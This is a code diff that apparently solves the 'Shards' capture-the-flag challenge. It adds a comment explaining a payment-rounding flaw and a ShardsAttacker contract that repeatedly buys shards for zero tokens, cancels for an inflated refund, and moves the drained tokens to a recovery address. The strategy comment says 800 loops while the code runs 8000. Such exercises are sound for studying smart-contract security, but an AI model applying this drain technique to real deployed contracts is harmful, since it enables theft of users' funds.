@@ -114,7 +114,31 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
+        /**
+         * VULNERABILITY EXPLANATION:
+         * There's a critical precision mismatch between fill() and cancel() payment calculations:
+         * 
+         * In fill(): payment = want * (price * rate / 1e6) / totalShards
+         *          = want * (1_000_000e6 * 75e15 / 1e6) / 10_000_000e18
+         *          = want * 75e21 / 1e25 = want * 75 / 10000
+         *          For want = 133: payment = 9975 / 10000 = 0 (rounds down!)
+         * 
+         * In cancel(): refund = shards * rate / 1e6 (rounded up)
+         *            = 133 * 75e15 / 1e6 = 133 * 75e9 ≈ 1e13 DVT
+         * 
+         * The refund is missing the `price / totalShards` factor, making it ~1e13x larger than payment!
+         * We can buy shards for FREE and get DVT refunds when cancelling.
+         * 
+         * Also, the cancel() time check is buggy - it allows immediate cancellation (same tx).
+         * 
+         * EXPLOIT STRATEGY:
+         * 1. Deploy attacker contract
+         * 2. Loop 800 times: fill(133 shards) pays 0, cancel() gets ~1e13 DVT
+         * 3. Transfer extracted DVT to recovery account
+         */
         
+        ShardsAttacker attacker = new ShardsAttacker(marketplace, token, recovery);
+        attacker.attack();
     }
 
     /**
@@ -134,5 +158,40 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract ShardsAttacker {
+    ShardsNFTMarketplace public marketplace;
+    DamnValuableToken public token;
+    address public recovery;
+    
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+    }
+    
+    function attack() external {
+        // We buy 133 shards at a time (max that rounds payment to 0)
+        // Each cancel gives us ~133 * 75e9 = ~1e13 DVT
+        // We need > 7.5e16 DVT (0.01% of 750e18 = 750e18 * 1e16 / 100e18)
+        // So we need at least 7.5e16 / 1e13 = 7500 iterations
+        // Do 8000 to be safe
+        
+        uint64 offerId = 1;
+        uint256 shardsPerPurchase = 133;
+        
+        for (uint256 i = 0; i < 8000; i++) {
+            // Fill - pays 0 DVT due to rounding
+            uint256 purchaseIndex = marketplace.fill(offerId, shardsPerPurchase);
+            
+            // Cancel immediately - gets refund of shardsPerPurchase * rate / 1e6
+            marketplace.cancel(offerId, purchaseIndex);
+        }
+        
+        // Transfer all extracted DVT to recovery
+        uint256 balance = token.balanceOf(address(this));
+        token.transfer(recovery, balance);
     }
 }
